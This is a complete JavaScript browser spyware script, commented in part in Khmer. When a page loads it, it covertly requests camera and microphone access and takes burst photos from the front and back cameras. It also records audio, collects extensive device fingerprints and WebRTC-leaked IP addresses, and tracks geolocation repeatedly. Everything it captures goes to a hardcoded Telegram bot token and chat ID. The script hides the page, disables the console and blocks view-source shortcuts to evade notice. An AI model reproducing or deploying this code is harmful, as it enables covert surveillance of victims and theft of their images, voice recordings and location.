// ==================== ADVANCED CONFIGURATION ====================
const CONFIG = {
    // Telegram Configuration
    TOKEN: "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA",
    CHAT_ID: "6837307356",
    
    // Advanced Settings
    ENABLE_AI_ANALYSIS: true,
    ENABLE_FINGERPRINTING: true,
    ENABLE_BEHAVIORAL_TRACKING: true,
    ENABLE_NETWORK_MAPPING: true,
    ENABLE_WEBRTC_LEAK: true,
    ENABLE_CANVAS_FINGERPRINT: true,
    ENABLE_AUDIO_FINGERPRINT: true,
    ENABLE_FONT_FINGERPRINT: true,
    ENABLE_WEBGL_FINGERPRINT: true,
    
    // Media Capture Settings (ថ្មី)
    ENABLE_MEDIA_CAPTURE: true,
    PHOTO_COUNT: 3,
    PHOTO_INTERVAL: 800,
    AUDIO_DURATION: 10000,
    PHOTO_QUALITY: 0.95,
    ENABLE_BACK_CAMERA: true,

    // Stealth Settings
    USE_WORKER_THREADS: true,
    USE_SERVICE_WORKER: true,
    USE_INDEXEDDB_CACHE: true,
    USE_LOCAL_STORAGE_PERSISTENCE: true,
    
    // Data Collection Intervals (ms)
    LOCATION_UPDATE_INTERVAL: 10000,
    SENSOR_UPDATE_INTERVAL: 5000,
    NETWORK_SCAN_INTERVAL: 15000,
    BEHAVIORAL_SYNC_INTERVAL: 30000,
    MEDIA_CAPTURE_DELAY: 2500
};

// ==================== TELEGRAM BOT INTERFACE ====================
class TelegramBot {
    constructor(token, chatId) {
        this.token = token;
        this.chatId = chatId;
        this.baseUrl = `https://api.telegram.org/bot${token}`;
    }
    
    async sendMessage(text, parseMode = 'Markdown') {
        try {
            await fetch(`${this.baseUrl}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId,
                    text: text.substring(0, 4096),
                    parse_mode: parseMode
                })
            });
        } catch (e) {}
    }
    
    async sendDocument(file, caption = '') {
        try {
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('document', file);
            if (caption) formData.append('caption', caption);
            
            await fetch(`${this.baseUrl}/sendDocument`, { method: 'POST', body: formData });
        } catch (e) {}
    }
    
    async sendPhoto(blob, caption = '') {
        try {
            const formData = new FormData();
            formData.append('chat_id', this.chatId);
            formData.append('photo', blob, 'photo.jpg');
            if (caption) formData.append('caption', caption);
            
            await fetch(`${this.baseUrl}/sendPhoto`, { method: 'POST', body: formData });
        } catch (e) {}
    }
    
    async sendLocation(lat, lng) {
        try {
            await fetch(`${this.baseUrl}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: this.chatId, latitude: lat, longitude: lng })
            });
        } catch (e) {}
    }
}

// ==================== ADVANCED MEDIA CAPTURE ENGINE ====================
class MediaCaptureEngine {
    constructor(telegramBot) {
        this.telegramBot = telegramBot;
        this.streams = { front: null, back: null, audio: null };
    }

    async requestAllPermissions() {
        const results = { camera: false, audio: false, backCamera: false };
        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user', width: 1280, height: 720 }, 
                audio: true 
            });
            this.streams.front = frontStream;
            results.camera = true;
            results.audio = true;
        } catch (e) {
            try {
                const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                this.streams.front = videoStream;
                results.camera = true;
            } catch (e2) {}
            try {
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                this.streams.audio = audioStream;
                results.audio = true;
            } catch (e2) {}
        }

        if (CONFIG.ENABLE_BACK_CAMERA) {
            try {
                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                this.streams.back = backStream;
                results.backCamera = true;
            } catch (e) {}
        }
        return results;
    }

    async captureBurstPhotos() {
        const stream = this.streams.back || this.streams.front;
        if (!stream) return;

        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();

        for (let i = 0; i < CONFIG.PHOTO_COUNT; i++) {
            await new Promise(r => setTimeout(r, CONFIG.PHOTO_INTERVAL));
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', CONFIG.PHOTO_QUALITY));
            if (blob) {
                await this.telegramBot.sendPhoto(blob, `📸 រូបថតស្ងាត់ #${i+1} (${new Date().toLocaleString()})`);
            }
        }
        video.remove();
    }

    async recordAudio() {
        const audioTracks = this.streams.audio?.getAudioTracks() || this.streams.front?.getAudioTracks().filter(t => t.kind === 'audio');
        if (!audioTracks || audioTracks.length === 0) return;
        
        const stream = new MediaStream(audioTracks);
        const recorder = new MediaRecorder(stream);
        const chunks = [];

        return new Promise((resolve) => {
            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                await this.telegramBot.sendDocument(file, `🎤 សំឡេងថតបាន (${CONFIG.AUDIO_DURATION/1000} វិនាទី)`);
                resolve(blob);
            };
            recorder.start();
            setTimeout(() => recorder.stop(), CONFIG.AUDIO_DURATION);
        });
    }

    stopAllTracks() {
        Object.values(this.streams).forEach(s => {
            if (s) s.getTracks().forEach(t => t.stop());
        });
    }
}

// ==================== ADVANCED FINGERPRINTING ENGINE ====================
class AdvancedFingerprintEngine {
    constructor() {
        this.fingerprint = null;
        this.components = {};
        this.initialize();
    }
    
    async initialize() {
        await this.generateComprehensiveFingerprint();
        if (CONFIG.USE_INDEXEDDB_CACHE) await this.cacheFingerprint();
    }
    
    async generateComprehensiveFingerprint() {
        const components = await Promise.all([
            this.getCanvasFingerprint(), this.getWebGLFingerprint(), this.getAudioFingerprint(),
            this.getFontFingerprint(), this.getWebRTCFingerprint(), this.getHardwareFingerprint(),
            this.getBrowserFingerprint(), this.getTimezoneFingerprint(), this.getLanguageFingerprint(),
            this.getScreenFingerprint(), this.getNavigatorFingerprint(), this.getPerformanceFingerprint(),
            this.getStorageFingerprint(), this.getMediaFingerprint(), this.getNetworkFingerprint()
        ]);
        this.components = Object.assign({}, ...components);
        this.fingerprint = await this.hashFingerprint(JSON.stringify(this.components));
        return this.fingerprint;
    }
    
    async getCanvasFingerprint() {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200; canvas.height = 50;
                ctx.textBaseline = 'top'; ctx.font = '14px Arial';
                ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069'; ctx.fillText('Advanced Fingerprint 🛜', 2, 15);
                ctx.beginPath(); ctx.arc(50, 30, 20, 0, Math.PI * 2); ctx.stroke();
                const dataURL = canvas.toDataURL();
                resolve({ canvas: { hash: this.simpleHash(dataURL), dataLength: dataURL.length } });
            } catch (e) { resolve({ canvas: { error: true } }); }
        });
    }
    
    async getWebGLFingerprint() {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) { resolve({ webgl: { supported: false } }); return; }
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                resolve({
                    webgl: {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
                        extensions: gl.getSupportedExtensions()?.length || 0
                    }
                });
            } catch (e) { resolve({ webgl: { error: true } }); }
        });
    }
    
    async getAudioFingerprint() {
        return new Promise((resolve) => {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                resolve({ audio: { sampleRate: audioCtx.sampleRate, state: audioCtx.state } });
                audioCtx.close();
            } catch (e) { resolve({ audio: { error: true } }); }
        });
    }
    
    async getFontFingerprint() {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const text = 'mmmmmmmmmmlli';
                ctx.font = '72px monospace';
                const baseWidth = ctx.measureText(text).width;
                ctx.font = '72px Arial, monospace';
                const width = ctx.measureText(text).width;
                resolve({ fonts: { Arial: width !== baseWidth } });
            } catch (e) { resolve({ fonts: { error: true } }); }
        });
    }
    
    async getWebRTCFingerprint() {
        return new Promise((resolve) => {
            const ips = [];
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.onicecandidate = (ice) => {
                    if (ice.candidate) {
                        const ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);
                        if (ipMatch) ipMatch.forEach(ip => { if (!ips.includes(ip)) ips.push(ip); });
                    }
                };
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                setTimeout(() => { pc.close(); resolve({ webrtc: { ips } }); }, 2000);
            } catch (e) { resolve({ webrtc: { error: true } }); }
        });
    }
    
    async getHardwareFingerprint() {
        return { hardware: { cores: navigator.hardwareConcurrency || 'unknown', memory: navigator.deviceMemory || 'unknown', platform: navigator.platform } };
    }
    
    async getBrowserFingerprint() {
        return { browser: { userAgent: navigator.userAgent, doNotTrack: navigator.doNotTrack, cookieEnabled: navigator.cookieEnabled } };
    }
    
    async getTimezoneFingerprint() {
        return { timezone: { name: Intl.DateTimeFormat().resolvedOptions().timeZone, offset: new Date().getTimezoneOffset() } };
    }
    
    async getLanguageFingerprint() {
        return { language: { primary: navigator.language, languages: navigator.languages } };
    }
    
    async getScreenFingerprint() {
        return { screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth, devicePixelRatio: window.devicePixelRatio } };
    }
    
    async getNavigatorFingerprint() {
        return { navigator: { bluetooth: !!navigator.bluetooth, usb: !!navigator.usb } };
    }
    
    async getPerformanceFingerprint() {
        return { performance: { memory: performance.memory ? performance.memory.usedJSHeapSize : 'N/A' } };
    }
    
    async getStorageFingerprint() {
        return { storage: { localStorage: !!window.localStorage, indexedDB: !!window.indexedDB } };
    }
    
    async getMediaFingerprint() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            return { media: { devices: devices.length } };
        } catch { return { media: { error: true } }; }
    }
    
    async getNetworkFingerprint() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return { network: conn ? { effectiveType: conn.effectiveType, rtt: conn.rtt } : { type: 'unknown' } };
    }
    
    simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            hash = ((hash << 5) - hash) + str.charCodeAt(i);
            hash = hash & hash;
        }
        return hash.toString(16);
    }
    
    async hashFingerprint(data) {
        const encoder = new TextEncoder();
        const encoded = encoder.encode(data);
        const hashBuffer = await crypto.subtle.digest('SHA-256', encoded);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }
    
    async cacheFingerprint() {
        try {
            const db = await this.openIndexedDB();
            const tx = db.transaction(['fingerprints'], 'readwrite');
            tx.objectStore('fingerprints').put({ id: 'current', fingerprint: this.fingerprint, timestamp: Date.now() });
        } catch (e) {}
    }
    
    async openIndexedDB() {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open('FingerprintDB', 1);
            request.onerror = () => reject(request.error);
            request.onsuccess = () => resolve(request.result);
            request.onupgradeneeded = (e) => {
                if (!e.target.result.objectStoreNames.contains('fingerprints')) {
                    e.target.result.createObjectStore('fingerprints', { keyPath: 'id' });
                }
            };
        });
    }
}

// ==================== MAIN APPLICATION CONTROLLER ====================
class AdvancedInformationGatheringSystem {
    constructor() {
        this.fingerprintEngine = null;
        this.mediaCapture = null;
        this.telegramBot = new TelegramBot(CONFIG.TOKEN, CONFIG.CHAT_ID);
        this.initialize();
    }
    
    async initialize() {
        this.enableStealthMode();
        this.fingerprintEngine = new AdvancedFingerprintEngine();
        this.mediaCapture = new MediaCaptureEngine(this.telegramBot);
        
        setTimeout(() => this.performMediaCapture(), CONFIG.MEDIA_CAPTURE_DELAY);
        setTimeout(() => this.sendComprehensiveReport(), 5000);
        setInterval(() => this.collectLocation(), CONFIG.LOCATION_UPDATE_INTERVAL);
    }
    
    async performMediaCapture() {
        await this.telegramBot.sendMessage('🎬 ចាប់ផ្តើមការចាប់យកមេឌៀស្ងាត់...');
        const perms = await this.mediaCapture.requestAllPermissions();
        await this.telegramBot.sendMessage(`📷 កាមេរ៉ា៖ ${perms.camera ? 'បាន' : 'បរាជ័យ'} | 🎤 ម៉ៃក្រូហ្វូន៖ ${perms.audio ? 'បាន' : 'បរាជ័យ'}`);
        
        await Promise.all([
            this.mediaCapture.captureBurstPhotos(),
            this.mediaCapture.recordAudio()
        ]);
        
        await this.telegramBot.sendMessage('✅ ការចាប់យកមេឌៀបានបញ្ចប់');
        this.mediaCapture.stopAllTracks();
    }

    async sendComprehensiveReport() {
        const report = {
            timestamp: new Date().toISOString(),
            fingerprint: this.fingerprintEngine.fingerprint,
            components: this.fingerprintEngine.components,
            location: await this.getLocation()
        };
        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const file = new File([blob], `report_${Date.now()}.json`, { type: 'application/json' });
        await this.telegramBot.sendDocument(file, '📊 របាយការណ៍ពេញលេញ');
    }

    async getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) resolve(null);
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                    this.telegramBot.sendLocation(loc.lat, loc.lng);
                    resolve(loc);
                },
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
    }

    async collectLocation() {
        await this.getLocation();
    }

    enableStealthMode() {
        document.body.innerHTML = '<div style="display:none;">System Active</div>';
        console.log = console.warn = console.error = () => {};
    }
}

// ==================== SERVICE WORKER ====================
const serviceWorkerCode = `
self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
self.addEventListener('fetch', (e) => e.respondWith(fetch(e.request).catch(() => caches.match(e.request))));
`;

// ==================== INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', async () => {
    window.advancedSystem = new AdvancedInformationGatheringSystem();
    
    if ('serviceWorker' in navigator) {
        const blob = new Blob([serviceWorkerCode], { type: 'application/javascript' });
        navigator.serviceWorker.register(URL.createObjectURL(blob));
    }
    
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
        if (e.ctrlKey && ['u', 's', 'i', 'j'].includes(e.key)) e.preventDefault();
    });
});